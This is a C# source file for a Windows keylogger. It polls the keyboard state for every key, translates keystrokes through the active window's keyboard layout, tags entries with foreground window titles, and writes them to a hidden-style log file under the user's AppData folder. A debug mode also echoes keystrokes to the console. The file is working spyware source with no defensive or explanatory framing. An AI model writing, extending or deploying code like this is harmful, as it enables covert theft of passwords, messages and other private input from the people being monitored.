using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
namespace Keylogger
{
    class Keylogger
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        public static extern IntPtr GetWindowText(IntPtr hWnd, StringBuilder textOut, int count);

        [DllImport("user32.dll")]
        public static extern IntPtr GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll", SetLastError = true)]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, uint dwhkl);

        private const int MAX_STRING_BUILDER = 256;
        private const bool DEBUG = true;
        private StreamWriter writer;
        private int counter;
        string path;

        public Keylogger()
        {
            counter = 0;
        }
        internal void start()
        {

            path = System.Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + "Xeytan";
            if (!System.IO.Directory.Exists(path))
                System.IO.Directory.CreateDirectory(path);

            path += "\\xeytanLogger.txt";
            Console.WriteLine(path);

            Keys key;
            using (writer = new StreamWriter(path, true))
            {
                string lastWindowText = "";
                string tempWindowText = "";
                while (true)
                {
                    for (Int32 i = 0; i < 1000; i++)
                    {
                        tempWindowText = getCurrentWindowText();
                        if (lastWindowText != tempWindowText)
                        {
                            lastWindowText = tempWindowText;
                            write("BEGIN WINDOW : ======= " + lastWindowText + " ====================\n");
                        }
                        int value = GetAsyncKeyState(i);
                        
                        if ((value & 0x8000) == 0 || (value & 0x1) == 0)
                            continue;
                        key = (Keys)i;
                        switch (key)
                        {
                            case Keys.LButton:
                            case Keys.MButton:
                            case Keys.RButton:
                            case Keys.Back:
                            case Keys.ShiftKey:
                            case Keys.Shift:
                            case Keys.LShiftKey:
                            case Keys.RShiftKey:
                            case Keys.Capital:
                                write(" [" + key.ToString() + "] ");
                                break;
                            case Keys.Enter:
                                write("\n");
                                break;
                            case Keys.Space:
                                write(" ");
                                break;
                            case Keys.Tab:
                                write("\t");
                                break;
                            case Keys.Escape:
                                if (DEBUG)
                                    return;
                                break;
                            default:

                                IntPtr hWindowHandle = GetForegroundWindow();
                                uint dwProcessId;
                                uint dwThreadId = GetWindowThreadProcessId(hWindowHandle, out dwProcessId);
                                byte[] kState = new byte[256];
                                GetKeyboardState(kState);
                                uint HKL = GetKeyboardLayout(dwThreadId);
                                StringBuilder keyName = new StringBuilder();
                                ToUnicodeEx((uint)i, (uint) i, kState, keyName, 16, 0, HKL);
                                write(keyName.ToString());
                                break;
                        }
                        
                    }

                    if (counter++ % 50 == 0)
                        writer.Flush();
                }
            }
        }

        private string getCurrentWindowText()
        {
            IntPtr handle = GetForegroundWindow();
            StringBuilder title = new StringBuilder(MAX_STRING_BUILDER);
            GetWindowText(handle, title, MAX_STRING_BUILDER);
            return title.ToString();
        }

        private void write(string s)
        {
            writer.Write(s);
            if (DEBUG)
                Console.Write(s);

            if (counter >= 1000)
            {
                writer.Close();
                writer = new StreamWriter(path, true);
                counter = 0;
            }
        }
    }
}
